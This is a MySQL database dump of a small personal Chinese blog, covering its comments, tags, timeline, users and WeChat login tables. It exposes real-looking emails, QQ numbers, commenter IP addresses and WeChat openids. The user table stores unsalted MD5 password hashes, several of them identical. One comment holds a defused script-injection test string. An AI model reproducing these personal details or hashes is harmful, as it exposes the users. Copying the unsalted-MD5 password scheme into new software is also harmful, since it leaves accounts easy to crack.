/*!40000 ALTER TABLE `info_comment` DISABLE KEYS */;
INSERT INTO `info_comment` VALUES (248,242,109,'大大哥你好 :idea:','评论测试4号','2941874207@qq.com','',1447743759,'245,评论测试3号','','0000-00-00 00:00:00','0000-00-00 00:00:00'),(245,242,109,'大哥你好 :mrgreen:','评论测试3号','2235004643@qq.com','',1447743552,'','','0000-00-00 00:00:00','0000-00-00 00:00:00'),(286,0,124,':smile:','一只特立独行的猪','867426952@qq.com','',1459144036,'','14.221.3.24','0000-00-00 00:00:00','0000-00-00 00:00:00'),(242,0,109,'我又回来测试啦！！','评论测试2号','867426952@qq.com','',1447742964,'','','0000-00-00 00:00:00','0000-00-00 00:00:00'),(254,0,109,'谢谢我的少女时代 :oops:','Aliceadmin','15879985929@qq.com','http://www.baidu.com',1448440167,'','14.156.41.191','0000-00-00 00:00:00','0000-00-00 00:00:00'),(257,0,108,'沙发...','Aliceadmin','867426952@qq.com','',1448854076,'','14.156.47.152','0000-00-00 00:00:00','0000-00-00 00:00:00'),(258,0,107,'又是沙发 :wink:','Aliceadmin','867426952@qq.com','',1448863387,'','14.156.47.152','0000-00-00 00:00:00','0000-00-00 00:00:00'),(259,0,103,'评论 :!:','Aliceadmin','867426952@qq.com','',1449113218,'','14.221.133.195','0000-00-00 00:00:00','0000-00-00 00:00:00'),(260,242,109,'牙疼啊艹...','Aliceadmin','867426952@qq.com','',1449624574,'248,评论测试4号','14.156.25.49','0000-00-00 00:00:00','0000-00-00 00:00:00'),(261,0,109,'360浏览器测试','360浏览器','867426952@qq.com','',1449814294,'','14.221.106.38','0000-00-00 00:00:00','0000-00-00 00:00:00'),(262,0,109,'哈哈哈哈','Aliceadmin','867426952@qq.com','',1449814497,'','14.221.106.38','0000-00-00 00:00:00','0000-00-00 00:00:00'),(263,0,109,'测试','测试','867426952@qq.com','',1449932320,'','119.146.192.97','0000-00-00 00:00:00','0000-00-00 00:00:00'),(264,263,109,'测试你个头 :idea:','Aliceadmin','867426952@qq.com','',1450430912,'','14.221.103.16','0000-00-00 00:00:00','0000-00-00 00:00:00'),(265,0,107,'分支交叉排序 :smile:','leunico','13826914162@qq.com','',1451469233,'','14.156.40.133','0000-00-00 00:00:00','0000-00-00 00:00:00'),(266,258,107,'邮箱发送测试 :cool:','leunico','13826914162@qq.com','',1451469264,'','14.156.40.133','0000-00-00 00:00:00','0000-00-00 00:00:00'),(267,0,103,'是的， 挺过去的...','xuping','xp199110@126.com','',1452479547,'','60.168.90.119','0000-00-00 00:00:00','0000-00-00 00:00:00'),(268,0,103,'这是什么什么房cms写的啊？','xuping','xp199110@126.com','',1452480564,'','60.168.90.119','0000-00-00 00:00:00','0000-00-00 00:00:00'),(269,268,103,'没有仿照cms啊，仿照了一些框架把~','Aliceadmin','867426952@qq.com','www.lzxya.com',1452481692,'','14.156.41.60','0000-00-00 00:00:00','0000-00-00 00:00:00'),(289,0,126,'<xsscript>console.log(\'sdsd\');</xsscript>','一只特立独行的猪','867426952@qq.com','',1459826245,'','14.222.172.123','0000-00-00 00:00:00','0000-00-00 00:00:00'),(290,0,108,'最近一直被如何实现扫一扫签到困扰着，直到看到这边文章，顿时豁然开朗，谢谢。','涣雨','1016489362@qq.com','',1460359463,'','174.139.200.146','0000-00-00 00:00:00','0000-00-00 00:00:00'),(291,0,108,'1016489362 我的QQ，求教，我查到微信API权限中，订阅号是不支持生成带参数二维码的，但是想请教下，您是如何实现这个功能的呢？','涣雨','1016489362@qq.com','',1460374087,'','124.200.39.2','0000-00-00 00:00:00','0000-00-00 00:00:00'),(274,0,109,'阿里云测试','一只特立独行的猪','867426952@qq.com','',1454032816,'','14.156.42.196','0000-00-00 00:00:00','0000-00-00 00:00:00'),(275,261,109,'搬到阿里云的测试！！ :mrgreen:','一只特立独行的猪','867426952@qq.com','',1454032841,'261,360浏览器','14.156.42.196','0000-00-00 00:00:00','0000-00-00 00:00:00'),(276,0,109,'nice,调试完成！','一只特立独行的猪','867426952@qq.com','',1454033207,'','14.156.42.196','0000-00-00 00:00:00','0000-00-00 00:00:00'),(282,242,109,':razz: 放假了！！','Leunico','xxx@xxx.com','',1454384896,'260,Aliceadmin','14.156.47.191','0000-00-00 00:00:00','0000-00-00 00:00:00'),(281,276,109,'纳尼','Leunico','xxx@xxx.com','',1454384832,'276,一只特立独行的猪','14.156.47.191','0000-00-00 00:00:00','0000-00-00 00:00:00'),(284,0,20,'卧槽！','一只特立独行的猪','867426952@qq.com','',1458899361,'','14.156.31.188','0000-00-00 00:00:00','0000-00-00 00:00:00'),(294,291,108,'首先，订阅号是没有二维码生成的，我这个是测试帐号，服务号应该是可以的。具体流程。第一步：获取带参数的二维码（这个网上很多资料的）。第二步：先把API配好，然手机端和服务器可以正常通信（看方倍工作室的，也不难），第三步：找到扫描二维码事件，在扫描二维码时获取他所带的参数然后保存到数据库（我上面说的很清楚了）。第四步：登录页面要用Ajax向后台查询是否有这个二维码参数，然后判断用户是否扫描过二维码。然后判断登录，就是这样~','一只特立独行的猪','867426952@qq.com','',1460442905,'291,涣雨','183.23.139.80','0000-00-00 00:00:00','0000-00-00 00:00:00'),(295,0,117,'真是悲伤...','一只特立独行的猪','867426952@qq.com','',1460443741,'','183.23.139.80','0000-00-00 00:00:00','0000-00-00 00:00:00'),(296,0,123,'666,copy to trying!','worthy','83507315@qq.com','',1465204918,'','202.103.51.185','0000-00-00 00:00:00','0000-00-00 00:00:00'),(297,0,128,'md5我记得有指出小几率重复，还有你这手机UI烂到没边了。','asd','admin@acgn.xyz','',1465650022,'','112.17.235.172','0000-00-00 00:00:00','0000-00-00 00:00:00'),(298,297,128,'咳咳，手机UI烂这点我承认，在自适应方面我不是很熟悉，后面也就没花时间去弄手机版了。。。 :???:','一只特立独行的猪','867426952@qq.com','',1465703496,'297,asd','14.222.168.251','0000-00-00 00:00:00','0000-00-00 00:00:00'),(299,0,105,'挺好看的，你的使用的织梦模板还是wp，是自己设计的模板么，很喜欢啊。','海里麦','94584940@qq.com','http://www.hailimai.com',1466071015,'','210.56.193.178','0000-00-00 00:00:00','0000-00-00 00:00:00'),(300,299,105,'自己弄的啦，没用模版，就是看到好看的网站后看源码然后截下来这样子。','Leunico','xxx@xxx.com','',1466523161,'299,海里麦','223.210.127.108','0000-00-00 00:00:00','0000-00-00 00:00:00'),(301,0,129,'楼主你好，你的博客很好看，有一个地方我不清楚，就是文章页面下拉得时候，图片有一个从小到大的过程，想问楼主这个这么实现，是用css3的动画吗','不点儿','i@tristana.cn','http://tristana.cn',1471755453,'','125.79.5.40','0000-00-00 00:00:00','0000-00-00 00:00:00'),(302,301,129,'这个啊，搜索一下这个：scrollmonitor.js，其实这个效果就是一个js插件来的~','一只特立独行的猪','867426952@qq.com','',1471836397,'301,不点儿','183.23.117.139','0000-00-00 00:00:00','0000-00-00 00:00:00'),(307,274,109,'新系统测试2333么么大','Leunico','867426952@qq.com','',1474449663,'274,一只特立独行的猪','192.168.1.180','2016-10-14 17:11:34','2016-09-21 17:21:04');
/*!40000 ALTER TABLE `info_comment` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `info_indexpush`
--

DROP TABLE IF EXISTS `info_indexpush`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `info_indexpush` (
  `pushurl` varchar(256) NOT NULL,
  `pushimg` varchar(256) NOT NULL,
  `ctime` int(11) NOT NULL,
  `id` tinyint(3) NOT NULL AUTO_INCREMENT,
  `created_at` datetime NOT NULL,
  `updated_at` datetime NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `info_indexpush`
--

LOCK TABLES `info_indexpush` WRITE;
/*!40000 ALTER TABLE `info_indexpush` DISABLE KEYS */;
INSERT INTO `info_indexpush` VALUES ('http://www.lzxya.com/class/liuy','http://7xq09h.com1.z0.glb.clouddn.com/push_1476954639.jpg?imageView2/1/w/810/h/200',1434538487,1,'0000-00-00 00:00:00','2016-10-20 17:18:01'),('http://weibo.com/u/3101570465','http://7xq09h.com1.z0.glb.clouddn.com/push_1476954961.jpg?imageView2/1/w/810/h/200',1434538487,2,'0000-00-00 00:00:00','2016-10-20 17:16:01'),('http://www.lzxya.com/class/timewait','http://7xnvnk.com1.z0.glb.clouddn.com/151202152603.jpg?imageView2/1/w/810/h/200',1434538487,3,'0000-00-00 00:00:00','0000-00-00 00:00:00'),('http://www.08cms.coms','http://7xnvnk.com1.z0.glb.clouddn.com/push_160329164128.jpg?imageView2/1/w/810/h/200',1434538487,4,'0000-00-00 00:00:00','2016-10-24 14:04:03');
/*!40000 ALTER TABLE `info_indexpush` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `info_tag`
--

DROP TABLE IF EXISTS `info_tag`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `info_tag` (
  `tag` varchar(50) NOT NULL COMMENT 'TAG内容',
  `num` int(11) NOT NULL DEFAULT '1' COMMENT '出现次数',
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `updated_at` datetime NOT NULL,
  `created_at` datetime NOT NULL,
  PRIMARY KEY (`id`),
  KEY `tag` (`tag`)
) ENGINE=MyISAM AUTO_INCREMENT=162 DEFAULT CHARSET=utf8 COMMENT='TAG';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `info_tag`
--

LOCK TABLES `info_tag` WRITE;
/*!40000 ALTER TABLE `info_tag` DISABLE KEYS */;
INSERT INTO `info_tag` VALUES ('LAMP',1,137,'0000-00-00 00:00:00','0000-00-00 00:00:00'),('SEO',1,118,'0000-00-00 00:00:00','0000-00-00 00:00:00'),('微信',2,119,'0000-00-00 00:00:00','0000-00-00 00:00:00'),('图片',3,124,'0000-00-00 00:00:00','0000-00-00 00:00:00'),('网站优化',1,154,'0000-00-00 00:00:00','0000-00-00 00:00:00'),('杂文',2,148,'0000-00-00 00:00:00','0000-00-00 00:00:00'),('建站',4,135,'0000-00-00 00:00:00','0000-00-00 00:00:00'),('Tag',6,134,'0000-00-00 00:00:00','0000-00-00 00:00:00'),('照片',1,136,'0000-00-00 00:00:00','0000-00-00 00:00:00'),('排序',1,138,'0000-00-00 00:00:00','0000-00-00 00:00:00'),('生活',1,139,'0000-00-00 00:00:00','0000-00-00 00:00:00'),('毕业',1,140,'0000-00-00 00:00:00','0000-00-00 00:00:00'),('短文',2,141,'2016-10-13 11:43:58','0000-00-00 00:00:00'),('青春',1,142,'0000-00-00 00:00:00','0000-00-00 00:00:00'),('博客',1,149,'0000-00-00 00:00:00','0000-00-00 00:00:00'),('RESTFUL',2,153,'2016-10-17 09:19:42','0000-00-00 00:00:00'),('阿里云',1,147,'0000-00-00 00:00:00','0000-00-00 00:00:00'),('爬虫日记',3,150,'0000-00-00 00:00:00','0000-00-00 00:00:00'),('Laravel5',1,152,'0000-00-00 00:00:00','0000-00-00 00:00:00'),('网站安全',1,155,'0000-00-00 00:00:00','0000-00-00 00:00:00'),('PHP方法',1,156,'0000-00-00 00:00:00','0000-00-00 00:00:00'),('数据',1,157,'0000-00-00 00:00:00','0000-00-00 00:00:00'),('东莞',2,161,'2016-10-13 14:36:40','2016-10-08 14:11:45');
/*!40000 ALTER TABLE `info_tag` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `info_time`
--

DROP TABLE IF EXISTS `info_time`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `info_time` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `classfa` varchar(32) NOT NULL,
  `img` varchar(128) NOT NULL,
  `content` varchar(512) NOT NULL,
  `ctime` int(11) NOT NULL,
  `time` varchar(64) NOT NULL,
  `order` tinyint(3) NOT NULL DEFAULT '0',
  `updated_at` datetime NOT NULL,
  `created_at` datetime NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=18 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `info_time`
--

LOCK TABLES `info_time` WRITE;
/*!40000 ALTER TABLE `info_time` DISABLE KEYS */;
INSERT INTO `info_time` VALUES (2,'fa-graduation-cap','http://7xnvnk.com1.z0.glb.clouddn.com/1449200221ttt.jpg','从景德镇陶瓷学院毕业,现在已经成为景德镇陶大了，好怀念啊~~~',1449190794,'2015年6月17号',1,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(5,'fa-paw','http://7xnvnk.com1.z0.glb.clouddn.com/1449200403logo1.jpg','来到东莞，正式踏入自己社会生涯',1449200403,'2015年6月21号',2,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(6,'fa-briefcase','http://7xnvnk.com1.z0.glb.clouddn.com/1449200749gg.png','就职于鼎点网络科技，加入<a style=\"color:#428bca;\" target=\"_blank\" href=\"http://baike.baidu.com/link?url=kEWcgyDnWPFL3F7J_jg5UCPfVRzlc2sohxnltMLJ_o7J-6_pYocncxe9dx0OP0Qk7WnEK_QCuH7bNkqpo6CcNa\" title=\"08CMS是用PHP+MySQL开发的一套网站内容管理系统（即CMS系统），使用08CMS可以快速建立一个门户网站，比如：汽车门户网站、房产门户网站、产品库报价网站和家装门户网站等。\">08CMS</a>开发团队！',1449200749,'2015年6月25号',3,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(7,'fa-automobile','http://7xnvnk.com1.z0.glb.clouddn.com/144920110520fff.jpg','一个人去了桂林阳朔，景色不错，更美好的是在旅途的路上...',1449201105,'2015年10月2号	',4,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(8,'fa-code','http://7xnvnk.com1.z0.glb.clouddn.com/1449201459sae.png','用PHP在SAE上开始开发Alice博客网站',1449201459,'2015年10月29号',5,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(9,'fa-music','http://7xnvnk.com1.z0.glb.clouddn.com/1449201622cm.jpg','去了今年的草莓音乐节，年轻就应该元气满满啊哈哈-。-！',1449201622,'2015年11月28号',6,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(10,'fa-html5','http://7xnvnk.com1.z0.glb.clouddn.com/1449201714fgggg.png','Alice博客网站基本完成，优化了部分JavaScript和Css的代码。',1449201714,'2015年12月6号',7,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(12,'fa-linux','http://7xnvnk.com1.z0.glb.clouddn.com/9541452842238.jpg','搬家啦！搬到阿里云~同时启用新域名lzxya.com',1452842238,'2016年1月15日',9,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(15,'fa-gears','http://7xq09h.com1.z0.glb.clouddn.com/diary_1476847759.jpg?imageView2/1/w/120/h/120','继续重构代码，引入容器储存Model层，同时云储存将金山换成七牛（金山迷の收费）。',1459306267,'2016年3月28日',10,'2016-10-19 11:29:20','0000-00-00 00:00:00'),(17,'fa-child','http://7xq09h.com1.z0.glb.clouddn.com/diary_1476849991.jpg?imageView2/1/w/120/h/120','悲伤那么大，你做错了啥？想想哦~~~~',1476849991,'2016年10月19日',13,'2016-10-19 12:06:32','2016-10-19 12:06:32');
/*!40000 ALTER TABLE `info_time` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `user`
--

DROP TABLE IF EXISTS `user`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `user` (
  `id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(32) NOT NULL,
  `password` varchar(32) NOT NULL,
  `is_admin` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `is_block` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `email` varchar(64) NOT NULL,
  `ctime` int(11) unsigned NOT NULL,
  `openid` varchar(64) NOT NULL,
  `wxname` varchar(64) NOT NULL,
  `updated_at` datetime NOT NULL,
  `created_at` datetime NOT NULL,
  PRIMARY KEY (`id`),
  KEY `email` (`email`),
  KEY `openid` (`openid`)
) ENGINE=MyISAM AUTO_INCREMENT=29 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `user`
--

LOCK TABLES `user` WRITE;
/*!40000 ALTER TABLE `user` DISABLE KEYS */;
INSERT INTO `user` VALUES (6,'一只特立独行的猪2号','e10adc3949ba59abbe56e057f20f883e',1,0,'867426952@qq.com',1445472959,'Not wechat','Not wechat','2016-10-14 08:47:52','0000-00-00 00:00:00'),(24,'Leunico','65a5b329f643cb72911c4a8d1dc2d859',0,0,'xxx@xxx.com',1454383286,'oROTAvzjFdyHdgcsNM4eFyHz-oZE','Leunico','0000-00-00 00:00:00','0000-00-00 00:00:00'),(15,'黎工','665d23b6ad61b5e48346624ade17b5c9',0,1,'',1445477259,'oROTAv5fs4Kwxz3Ba0y7z1VNddzk','黎工','0000-00-00 00:00:00','0000-00-00 00:00:00'),(16,'追求幸福','43d45e358fe860f18f3f089650d1e9c0',0,0,'',1445476959,'oROTAvwm_ON0oHRa0MAVibFOtZ4s','追求幸福','0000-00-00 00:00:00','0000-00-00 00:00:00'),(21,'test','e10adc3949ba59abbe56e057f20f883e',0,0,'88888888@qq.com',1446449279,'Not wechat','Not wechat','0000-00-00 00:00:00','0000-00-00 00:00:00'),(25,'书灵','bc7899d963b67f27dbebcd8c58fbe25e',0,0,'xxx',1460358627,'oROTAv8KLWMJ8ZLsFNPBaNBKVaxc','书灵','0000-00-00 00:00:00','0000-00-00 00:00:00'),(26,'宝树','faa99ed723313b032f87d8421bcf2e95',0,0,'xxx',1465209933,'oROTAv-N7QVbP7EjYgv1fc3LwJeg','宝树','0000-00-00 00:00:00','0000-00-00 00:00:00'),(27,'mg','214583c4881a0f1bce302ff7b2278ea8',0,0,'xxx',1466070945,'oROTAv7eMohfByt-rHHr9aMzFb84','mg','0000-00-00 00:00:00','0000-00-00 00:00:00'),(28,'哈哈明','e10adc3949ba59abbe56e057f20f883e',0,0,'123123123@qq.com',0,'Not wechat','Not wechat','2016-10-14 11:21:32','2016-10-14 11:21:32');
/*!40000 ALTER TABLE `user` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `weixin_login`
--

DROP TABLE IF EXISTS `weixin_login`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `weixin_login` (
  `scene_id` int(16) NOT NULL,
  `openid` varchar(64) NOT NULL,
  `wxname` varchar(64) NOT NULL,
  `created_at` datetime NOT NULL,
  `updated_at` datetime NOT NULL,
  KEY `scene_id` (`scene_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `weixin_login`
--

LOCK TABLES `weixin_login` WRITE;
/*!40000 ALTER TABLE `weixin_login` DISABLE KEYS */;
INSERT INTO `weixin_login` VALUES (417,'oROTAv8KLWMJ8ZLsFNPBaNBKVaxc','书灵','0000-00-00 00:00:00','0000-00-00 00:00:00'),(913,'oROTAvzjFdyHdgcsNM4eFyHz-oZE','Leunico','0000-00-00 00:00:00','0000-00-00 00:00:00');
/*!40000 ALTER TABLE `weixin_login` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2017-02-27 17:42:48
